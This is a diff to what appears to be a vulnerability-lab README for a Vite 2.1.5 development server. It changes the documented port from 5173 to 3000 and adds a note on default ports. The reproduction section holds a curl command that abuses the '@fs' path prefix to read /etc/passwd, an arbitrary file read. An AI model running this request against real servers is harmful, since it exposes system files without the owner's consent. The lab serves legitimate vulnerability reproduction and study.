@@ -18,14 +18,16 @@ Execute the following command to start a Vite 2.1.5 development server:
 docker compose up -d
 ```
 
-After the server starts, you can access the Vite development environment at `http://your-ip:5173`.
+After the server starts, you can access the Vite development environment at `http://your-ip:3000`.
+
+> Note: The development server of the old version of Vite defaults to port 3000, while the new version defaults to port 5173, please pay attention to the difference.
 
 ## Vulnerability Reproduction
 
 You can read arbitrary files on the filesystem by using the standard `@fs` prefix:
 
 ```bash
-curl "http://your-ip:5173/@fs/etc/passwd"
+curl "http://your-ip:3000/@fs/etc/passwd"
 ```
 
 ![](1.png)
